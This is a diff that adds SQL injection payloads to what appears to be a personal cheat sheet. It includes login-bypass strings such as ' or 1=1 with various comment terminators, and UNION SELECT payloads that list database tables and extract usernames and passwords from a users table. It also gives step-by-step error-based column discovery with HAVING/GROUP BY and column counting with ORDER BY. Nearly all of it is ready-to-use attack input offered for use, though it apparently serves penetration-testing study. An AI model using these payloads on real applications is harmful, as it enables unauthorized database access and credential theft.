@@ -1,3 +1,38 @@
+'or 1=1
+'or 1=1--
+'or 1=1#
+'or 1=1/*
+
+10 union SELECT table_schema,1,table_name,table_name,table_name,table_name,table_name FROM information_schema.tables limit 1 offset 40--
+10 UNION SELECT username,1,username,username,username,username,password FROM super_secret_users limit 1--
+
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
+Error Based - Find Columns Names
+Finding Column Names with HAVING BY - Error Based (S)
+
+In the same order,
+
+    ' HAVING 1=1 --
+    ' GROUP BY table.columnfromerror1 HAVING 1=1 --
+    ' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+    ' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
+    If you are not getting any more error then it's done.
+
+Finding how many columns in SELECT query by ORDER BY (MSO+)
+
+Finding column number by ORDER BY can speed up the UNION SQL Injection process.
+
+    ORDER BY 1--
+    ORDER BY 2--
+    ORDER BY N-- so on
+    Keep going until get an error. Error means you found the number of selected columns.
+
+
+
+
+
+
 or 1=1
 or 1=1--
 or 1=1#
